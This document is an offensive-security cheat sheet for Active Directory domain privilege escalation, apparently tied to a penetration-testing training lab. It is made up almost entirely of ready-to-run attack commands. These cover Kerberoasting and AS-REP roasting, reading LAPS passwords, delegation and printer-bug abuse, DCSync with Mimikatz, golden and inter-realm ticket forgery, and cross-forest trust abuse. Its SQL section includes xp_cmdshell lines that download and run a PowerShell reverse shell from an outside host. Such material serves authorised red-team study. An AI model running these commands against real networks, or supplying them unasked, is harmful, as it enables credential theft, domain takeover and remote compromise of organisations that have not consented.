# Domain Privilege escalation
* [Kerberoast](#Kerberoast) 
  * [Set SPN](#Set-SPN)
* [AS-REP Roasting](#AS-REP-Roasting) 
  * [Set pre-auth not required](#Set-pre-auth-not-required)  
* [Access Control List(ACL)](#Access-Control-List)
* [MS Exchange](#MS-Exchange) 
* [Delegation](#Delegation) 
  * [Unconstrained Delegation](#Unconstrained-delegation) 
    * [Printer Bug](#Printer-bug) 
  * [Constrained Delegation](#Constrained-delegation) 
* [DNS Admins](#DNS-Admins)
* [Trust abuse SQL](#Trust-abuse-SQL)
* [Cross Domain attacks](#Cross-Domain-attacks)
  * [MS Exchange](#MS-Exchange2)
  * [Azure AD](#Azure-AD)
  * [Trust abuse SQL](#Trust-abuse-SQL)
  * [Child to Forest Root](#Child-to-Forest-Root)
    * [Trust key](#Trust-key)
    * [Krbtgt hash](#Krbtgt-hash)
* [Cross Forest attacks](#Crossforest-attacks)
  * [Kerberoast](#Kerberoast2)
  * [Printer Bug](#Printer-bug2) 
  * [Trust flow](#Trust-flow) 
  * [Trust abuse SQL](#Trust-abuse-SQL)
  * [Foreign Security Principals](#Foreign-Security-Principals)
  * [ACLs](#ACLs)
  * [Pam Trust](#Pam-Trust)
 

## Kerberoast
- https://github.com/GhostPack/Rubeus
#### Find user accounts used as service accounts
```
. ./GetUserSPNs.ps1
```

```
Get-DomainUser -SPN
Get-DomainUser -SPN | select samaccountname,serviceprincipalname
```

```
Rubeus.exe kerberoast /stats
```

#### Reguest a TGS
```
Rubeus.exe kerberoast /user:<SERVICEACCOUNT> /simple /domain <DOMAIN> /outfile:kerberoast_hashes.txt
Rubeus.exe kerberoast /rc4opsec /outfile:kerberoast_hashes.txt
```

```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
```

```
Request-SPNTicket "<SPN>"
```

#### Request TGS Avoid detection
- Based on encryption downgrade for Kerberos Etype (used by likes ATA - 0x17 stands for rc4-hmac).
- Look for kerberoastable accounts that only supports RC4_HMAC
```
Rubeus.exe kerberoast /stats /rc4opsec
Rubeus.exe kerberoast /user:<SERVICEACCOUNT> /simple /rc4opsec
```

#### Export ticket using Mimikatz
```
Invoke-Mimikatz -Command '"Kerberos::list /export"'
```

#### Crack the ticket
Crack the password for the serviceaccount
```
python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-student1@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
```

```
.\hashcat.exe -m 13100 -a 0 <HASH FILE> <WORDLIST>
```

```
.\John.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt hashes.txt
```

### Set SPN
- If we have sufficient permissions (GenericAll/GenericWrite). It is possible to set a SPN and then kerberoast!
#### Enumerate permissions for group on ACL
```
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<SAMACCOUNTNAME>"}
```

#### Set SPN for the user
- Must be unique accross the forest. 
- Format ```<STRING>/<STRING>```
```
. ./PowerView_dev.ps1
Set-DomainObject -Identity <username> -Set @{serviceprincipalname=’<ops/whatever1>’}
```

#### Then Kerberoast user

## LAPS
- Local Administrator Password Solution (LAPS)
- On a computer, if LAPS is in use, a library AdmPwd.dll can be found in the C:\Program Files\LAPS\CSE directory.

#### Find all users who can read passwords in clear test machines in OU's
```
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
```

```
Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1
Find-AdmPwdExtendedRights -Identity OUDistinguishedName
```

#### Read clear-text passwords:
```
Get-ADObject -SamAccountName <MACHINE NAME$> | select -ExpandProperty ms-mcs-admpwd
```

```
Get-AdmPwdPassword -ComputerName <MACHINE NAME>
```

## AS-REP Roasting
#### Enumerating accounts with kerberos preauth disabled
```
. .\Powerview_dev.ps1
Get-DomainUser -PreauthNotRequired -Verbose
```
```
Get-DomainUser -PreauthNotRequired -verbose | select samaccountname
```

#### Request encrypted AS-REP
```
. ./ASREPRoast.ps1
Get-ASREPHash -Username <username> -Verbose
```

#### Enumerate all users with kerberos preauth disabled and request a hash
```
Invoke-ASREPRoast -Verbose
Invoke-ASREPRoast -Verbose | fl
```

#### Crack the hash with hashcat
Edit the hash by inserting '23' after the $krb5asrep$, so $krb5asrep$23$.......
```
Hashcat -a 0 -m 18200 hash.txt rockyou.txt
```

### Set pre-auth not required
- With enough rights (GenericWrite of GenericAll) it is possible to set pre-auth not required.

#### Enumerate permissions for group
```
Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”}
Invoke-ACLScanner -ResolveGUIDS | Where-Object {$_.IdentityReference -match “<groupname>”} | select IdentityReference, ObjectDN, ActiveDirectoryRights | fl
```

#### Set preauth not required
```
. ./PowerView_dev.ps1
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

## Access Control List
- It is possible to abuse permissions (ACL's)
- `ObjectDN` = The object the permissions apply to
- `ActiveDirectoryRight` == Permissions
- `IdentityReferenceName` == Object who has the permissions
```
Find-InterestingDomainAcl -ResolveGUIDS -Domain <DOMAIN>
```

#### Set SPN
- See [Set SPN](#Set-SPN) 

### Add user to a group
```
Add-DomainGroupMember -Identity "<GROUP>" -Members <DOMAIN>\<USER>
```

#### Set users password
```
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
Set-DomainUserPassword Identity <USER> -AccountPassword $password -Domain <DOMAIN>
```

## MS Exchange
- https://github.com/dafthack/MailSniper

#### Enumerate all mailboxes
```
Get-GlobalAddressList -ExchHostname us-exchange -Verbose -UserName <DOMAIN>\<USER> -Password <PASSWORD>
```

#### Check access to mailboxes with current user
```
Invoke-OpenInboxFinder -EmailList emails.txt -ExchHostname us-exchange -Verbose
```

#### Read e-mails
- The below command looks for terms like pass, creds, credentials from top 100 emails
```
Invoke-SelfSearch -Mailbox <EMAIL> -ExchHostname <EXCHANGE SERVER NAME> -OutputCsv .\mail.csv
```

## Delegation
### Unconstrained Delegation
- To execute attack owning the server with unconstrained delegation is required!

#### Discover domain computers which have unconstrained delegation
- Domain Controllers always show up, ignore them
- Use the ```-domain``` flag to check for other domain
```
Get-DomainComputer -UnConstrained
Get-DomainComputer -UnConstrained | select samaccountname
```

#### Check if any DA tokens are available on the unconstrained machine
- Wait for a domain admin to login while checking for tokens
```
Invoke-Mimikatz -Command '"sekurlsa::tickets"'
```

#### Export the TGT ticket
```
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```

```
.\Rubeus.exe monitor /interval:5
```

#### Reuse the TGT ticket
```
Invoke-Mimikatz -Command '"kerberos::ptt <KIRBI FILE>"'
```

```
# Copy the base64 encoded TGT, remove extra spaces and use it on the attacker' machine:
.\Rubeus.exe ptt /ticket:<TICKET FILE>
```

#### Run DCSync to get credentials:
- use ```/all``` instead of ```/user``` to list all users
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
```

### Printer bug
- A feature of MS-RPRN which allows any domain user (Authenticated User) can force any machine (running the Spooler service) to connect to second a machine of the domain user's choice.
- A way to force a TGT of DC on the target machine
- https://github.com/leechristensen/SpoolSample
#### Check if spool server is running
```
#Edit IP at the bottom
spoolerscan.ps1
```

```
ls \\<DC>\pipe\spoolss
```

#### Attack
```
.\MS-RPRN.exe \\<DC NAME> \\<TARGET SERVER WITH DELEGATION>
```

### Constrained Delegation
- To execute attack owning the user or server with constrained delegation is required.
#### Enumerate users with contrained delegation enabled
- Use the ```-domain``` flag to check for other domains
```
Get-DomainUser -TrustedToAuth
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
```

#### Enumerate computers with contrained delegation enabled
- Use the ```-domain``` flag to check for other domains
```
Get-Domaincomputer -TrustedToAuth
Get-Domaincomputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
```

### Constrained delegation User
#### Rubeus calculate password hash
- If only password is available calculate the hash
```
.\Rubeus.exe hash /password:<PASSWORD> /user:<USER> /domain:<DOMAIN>
```

#### Rubeus request and inject TGT + TGS
- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
```
.\Rubeus.exe s4u /user:<USERNAME> /rc4:<NTLM HASH> /impersonateuser:administrator /domain:<DOMAIN> /msdsspn:<SERVICE ALLOWED TO DELEGATE>/<SERVER FQDN> /altservice:<SECOND SERVICE> /<SERVER FQDN> /ptt
```

#### Requesting TGT with kekeo
```
./kekeo.exe
Tgt::ask /user:<USERNAME> /domain:<DOMAIN> /rc4:<NTLM HASH>
```

#### Requesting TGS with kekeo
```
Tgs::s4u /tgt:<TGT> /user:Administrator@<DOMAIN> /service:<SERVICE ALLOWED TO DELEGATE/<FQDN SERVER>|<SECOND SERVICE>/<SERVER FQDN>
```

#### Use Mimikatz to inject the TGS ticket
```
Invoke-Mimikatz -Command '"kerberos::ptt <KIRBI FILE>"'
```

#### Run DCSync to get credentials:
- use ```/all``` instead of ```/user``` to list all users
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
```

### Constrained delegation Computer
#### Requesting TGT with a PC hash
```
./kekeo.exe
Tgt::ask /user:dcorp-adminsrv$ /domain:<DOMAIN> /rc4:<HAHS>
```

#### Requesting TGS
No validation for the SPN specified
```
Tgs::s4u /tgt:<kirbi file> /user:Administrator@<DOMAIN> /service:<SERVICE ALLOWED TO DELEGATE/<MACHINE NAME>|ldap/<MACHINE NAME>
```

#### Using mimikatz to inject TGS ticket and executing DCsync
- use ```/all``` instead of ```/user``` to list all users
```
Invoke-Mimikatz -Command '"Kerberos::ptt <KIRBI FILE>"'
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"'
```

## DNS Admins
#### Enumerate member of the DNS admin group
```
Get-NetGRoupMember “DNSAdmins”
```

#### From the privilege of DNSAdmins group member, configue DDL using dnscmd.exe (needs RSAT DNS)
Share the directory the ddl is in for everyone so its accessible.
logs all DNS queries on C:\Windows\System32\kiwidns.log 
```
Dnscmd <dns server> /config /serverlevelplugindll \\<ip>\dll\mimilib.dll
```

#### Restart DNS
```
Sc \\<dns server> stop dns
Sc \\<dns server> start dns
```

## Cross Domain attacks
### MS Exchange2
![afbeelding](https://user-images.githubusercontent.com/43987245/119706037-bf8d3000-be59-11eb-84cc-6568ba6e5d26.png)

#### Enumerate if exchange groups exist
```
. ./Powerview.ps1
Get-DomainGroup *exchange* -Domain <DOMAIN>
```

#### Enumerate membership of the groups
```
Get-DomainGroupMember "Organization Management" -Domain <DOMAIN>
Get-DomainGroupMember "Exchange Trusted Subsystem" -Domain <DOMAIN>
```

#### If we have privileges of a member of the Organization Management, we can add a user to the 'Exchange Windows Permissions' group.
```
$user = Get-DomainUser -Identity <USER>
$group = Get-DomainGroup -Identity 'Exchange Windows Permissions' -Domain <DOMAIN>
Add-DomainGroupMember -Identity $group -Members $user -Verbose
```

#### Add permissions to execute DCSYNC
```
Add-DomainObjectAcl -TargetIdentity 'DC=<PARENT DOMAIN>,DC=<TOP DOMAIN>' -PrincipalIdentity '<CHILD DOMAIN>\<USER>' -Rights DCSync -Verbose
```

#### Execute DCSYNC
- use ```/all``` instead of ```/user``` to list all users
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<PARENT DOMAIN>\krbtgt /domain:<PARENT DOMAIN>"'
```

#### If we have privileges of 'exchange user', who is a member of the Exchange Trusted Subsystem, we can add any user to the DNSAdmins group:
```
$user = Get-DomainUser -Identity <USER>
$group = Get-DomainGroup -Identity 'DNSAdmins' -Domain <DOMAIN>
Add-DomainGroupMember -Identity $group -Members $user -Verbose
```

## Azure AD
#### Enumerate where PHS AD connect is installed
```
Get-DomainUser -Identity "MSOL_*" -Domain <DOMAIN>
```

#### On the AD connect server extract MSOL_ Credentials
```
.\adconnect.ps1
```

#### Run cmd as MSOL_
```
runas /user:<DOMAIN>\<USER> /netonly cmd
```

#### Execute DCSync
- use ```/all``` instead of ```/user``` to list all users
```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
```

## Child to Forest Root
### Trust key
- Abuses SID History
#### Dump trust keys
- Look for in trust key from child to parent (first command)
- The mimikatz option /sids is forcefully setting the SID history for the Enterprise Admin group for the Forest Enterprise Admin Group
```
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computername <COMPUTERNAME>
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<CHILD DOMAIN>\<PARENT DOMAIN>$"'
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

#### Create an inter-realm TGT
- Uses well know Enterprise Admins SIDS
- ```Get-DomainGroup "Enterprise Admins" -Domain <TARGET DOMAIN> | select samaccountname, objectsid```
```
Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<SID CHILD DOMAIN> /sids:<SIDS OF ENTERPRISE ADMIN GROUP OF TARGET> /rc4:<TRUST KEY HASH> /service:krbtgt /target:<FQDN PARENT DOMAIN> /ticket:<PATH TO SAVE TICKET>"'
```

#### Create a TGS using Rubeus and inject current Powershell session
- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
```
.\Rubeus.exe asktgs /ticket:<KIRBI FILE> /service:<SERVICE>/<FQDN PARENT DC> /dc:<FQDN PARENT DC> /ptt
```

#### Create a TGS for a service (kekeo_old and new)
- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
```
./asktgs.exe <KIRBI FILE> <SERVICE>/<FQDN PARENT DC>
tgs::ask /tgt:<KIRBI FILE> /service:<SERVICE>/<FQDN PARENT DC>
```

#### Use TGS to access the targeted service (may need to run it twice) (kekeo_old and new)
```
./kirbikator.exe lsa .\<KIRBI FILE>
misc::convert lsa <KIRBI FILE>
```

#### Check access to server
```
dir \\<FQDN PARENT DC>\C$ 
Enter-PSSession <COMPUTERNAME>
.\PsExec64.exe \\<COMPUTERNAME> cmd
```

### Krbtgt hash
- Abuses SID History
#### Get krbtgt hash from dc
```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <computername>
```

#### Create TGT and inject in current session
- The mimikatz option /sids is forcefully setting the SID history for the Enterprise Admin group for the Forest Enterprise Admin Group
- ```Get-DomainGroup "Enterprise Admins" -Domain <TARGET DOMAIN> | select samaccountname, objectsid```
```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<FQDN CHILD DOMAIN> /sid:<CHILD DOMAIN SID> /krbtgt:<HASH> /sids:<SIDS OF ENTERPRISE ADMIN GROUP OF TARGET> /ptt"'
```

#### Check access to server
```
dir \\<FQDN PARENT DC>\C$ 
Enter-PSSession <COMPUTERNAME>
.\PsExec64.exe \\<COMPUTERNAME> cmd
```

## Crossforest attacks
### Kerberoast2
#### Enumerate users with SPN cross-forest
```
Get-DomainTrust | ?{$_.TrustAttributes -eq 'FILTER_SIDS'} | %{Get-DomainUser -SPN -Domain $_.TargetName} 
```

#### Request and crack TGS see:
See [Kerberoast](#Kerberoast) 

### Printer bug2
-  It also works across a Two-way forest trust with TGT Delegation enabled!

#### Check if TGTDelegation is enabled (run on DC)
```
netdom trust <CURRENT FOREST> /domain:<TRUSTED FOREST> /EnableTgtDelegation
```

See [Printer Bug](#Printer-bug) for exploitation

### Trust flow
-  By abusing the trust flow between forests in a two way trust, it is possible to access resources across the forest boundary which are explicity shared with a specific forest.
-  There is no way to enumerate which resources are shared.

#### Dump trust keys
- Look for in trust key from child to parent (first command)
```
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -Computername <COMPUTERNAME>
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<CHILD DOMAIN>\<PARENT DOMAIN>$"'
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

#### Create a intern-forest TGT
```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /rc4:<HASH OF TRUST KEY> /service:krbtgt /target:<TARGET FOREST> /ticket:<KIRBI FILE>"'
```

#### Create and inject TGS
- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
```
.\Rubeus.exe asktgs /ticket:<KIRBI FILE> /service:CIFS/<TARGET SERVER> /dc:<TARGET FOREST DC> /ptt
```

#### Create a TGS for a service (kekeo_old)
- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
```
./asktgs.exe <KIRBI FILE> CIFS/<TARGET SERVER>
```

#### Inject the TGS
```
./kirbikator.exe lsa <KIRBI FILE>
```

#### Check access to server
```
dir \\<SERVER NAME>\<SHARE>\
```

### SID history enabled
- If a external trust has SID history enabled. It is possible to inject a SIDHistory for RID => 1000 (higher then 1000) to access resources accessible to that identity or group in the target trusting forest. Needs to be user created!

#### Enumerate if SIDFilteringForestAware is enabled
- Run on the DC.
```
Get-ADTrust -Filter *
```

#### Enumerate groups of the target forest with SID higher then 1000
```
Get-ADGroup -Filter 'SID -ge "S-1-5-21-<DOMAIN SID PART>-1000"' -Server <TARGET FOREST>
```

#### Create a intern-forest TGT
```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN SID> /rc4:<HASH OF TRUST KEY> /service:krbtgt /target:<TARGET FOREST> /sids<SID OF THE GROUP>  /ticket:<KIRBI FILE>"'
```

#### Create and inject TGS
- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
```
.\Rubeus.exe asktgs /ticket:<KIRBI FILE> /service:<SERVICE>/<TARGET SERVER> /dc:<TARGET FOREST DC> /ptt
```

#### Create a TGS for a service (kekeo_old)
- Possbible services: CIFS for directory browsing, HOST and RPCSS for WMI, HOST and HTTP for PowerShell Remoting/WINRM, LDAP for dcsync
```
./asktgs.exe <KIRBI FILE> <SERVICE>/<TARGET SERVER>
```

#### Inject the TGS
```
./kirbikator.exe lsa <KIRBI FILE>
```

#### Use the TGS and execute DCsync or psremoting etc!

## Trust abuse SQL
- Could be possible cross domain or cross forest!
```
. .\PowerUpSQL.ps1
```
### Check connections
#### Discovery of SQL instances (SPN scanning)
```
Get-SQLInstanceDomain
```

#### Check accessibility to SQL servers
```
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded –Verbose
```

#### Gather information
- If connection succes! Connect to the DB with heidiSQL and look in it!
```
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```

### Database links
#### Search for links to remote servers
```
Get-SQLServerLink -Instance <SQL INSTANCE> -Verbose
```

#### Crawl links to remote servers
```
Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Verbose
```

#### Crawl links and show servers where we are sysadmin
```
Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> | Where-Object -Property sysadmin -Match 1
```

#### Crawl and try to use xp_cmdshell on every link
```
Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Query 'exec master..xp_cmdshell ''whoami'''
Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Query 'exec master..xp_cmdshell ''whoami''' | Where-Object CustomQuery
```

### Audit
#### Audit for issues
```
Invoke-SQLAudit -Verbose -Instance <SQL INSTANCE>
```

### Exploitation
#### Impersonation attack
#### Check if impersonation is possible
```
Invoke-SQLAuditPrivImpersonateLogin -Instance <SQL INSTANCE> -Verbose -Debug -Exploit
```

#### Check for impersonation through link
```
Get-SQLServerLinkCrawl -Instance <INSTANCE> -Verbose -Query 'SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = ''IMPERSONATE'''
```

#### Check if impersonation is possible
```
-- Find users that can be impersonated
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
```

#### Impersonate a user
- Might be possible to impersonate user a and then user b and then sa!
```
-- Verify you are still running as the normal user login
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
-- Impersonate the sa login
EXECUTE AS LOGIN = 'sa'
-- Verify you are now running as the sa login
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```

#### Enable and run xp_cmdshell
```
-- Enable show options
EXEC sp_configure 'show advanced options',1
RECONFIGURE
GO
-- Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell',1
RECONFIGURE
GO
-- Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'
```

### Command execution
#### Execute commands
```
Get-SQLServerLinkCrawl -Instance <SQL INSTANCE> -Query "exec master..xp_cmdshell 'whoami'"
Invoke-SQLOSCmd -Instance <SQL INSTANCE> -Verbose -Command "Whoami" -Threads 10
```

#### Execute command through links
```
select * from openquery("192.168.23.25",'select * from openquery("db-sqlsrv",''select @@version as version;exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''''http://192.168.100.X/Invoke-PowerShellTcp.ps1'''')"'')')
```

#### Execute reverse shell example
```
Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'Powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000'"
```

### Data exfiltration
```
#When able to connect directy to the instance
Get-SQLDatabase
Get-SQLTable
Get-SQLColumn
Get-SQLQuery -Query "use <DATABASE>; SELECT * from <TABLE>"

#Through links
List databases
Get-SQLServerLinkCrawl -Instance <INSTANCE> -Query 'SELECT name FROM master..sysdatabases;' | Where-Object customquery | Select-Object instance, customquery -ExpandProperty customquery | Select-Object instance, name

List tables
Get-SQLServerLinkCrawl -Instance <INSTANCE> -QueryTarget AC-DBBUSINESS -Query "SELECT name FROM <DATABASE>..sysobjects WHERE xtype = 'U'" | Select-Object -ExpandProperty customquery

List columns

List the contents of table
```

### Commands
#### Check if current user is sysadmin
```
SELECT IS_SRVROLEMEMBER('sysadmin')
```

#### Check if a user is sysadmin
```
SELECT IS_SRVROLEMEMBER('sysadmin','<USER>')
```

#### List all sysadmins
```
SELECT   name,type_desc,is_disabled FROM     master.sys.server_principals  WHERE    IS_SRVROLEMEMBER ('sysadmin',name) = 1 ORDER BY name
```

## Foreign Security Principals
- A Foreign Security Principal (FSP) represents a Security Principal in a external forest trust or special identities (like Authenticated Users, Enterprise DCs etc.).

#### Enumerate FSP's
```
Find-ForeignGroup -Verbose
Find-ForeignUser -Verbose
```

#### Enumerate users who are in groups outside of the user’s current domain
```
Get-DomainForeignUser 
```

#### Enumerates group in the target domain that contain users/groups who are not in the target domain.
```
Get-DomainForeignGroupMember -Domain <TARGET DOMAIN FQDN>
```

## ACLS
- Access to resources in a forest trust can also be provided without using FSPs using ACLs.
```
Find-InterestingDomainAcl -Domain <TRUST FOREST>
```
- Abuse ACL to other forest.


## Pam Trust
- PAM trust is usually enabled between a Bastion or Red forest and a production/user forest which it manages. 
- PAM trust provides the ability to access a forest with high privileges without using credentials of the current forest. Thus, better security for the bastion forest which is much desired.
-  To achieve the above, Shadow Principals are created in the bastion domain which are then mapped to DA or EA groups SIDs in the production forest.

#### Enumerate if there is a PAM trust
- Run on the DC
```
Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}
```

#### Check which users are members of the shadow principalks
- Run on the DC
```
{Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl
```

#### Pssession to the other forest machine
```
Enter-PSSession <IP> -Authentication NegotiateWithImplicitCredential
```
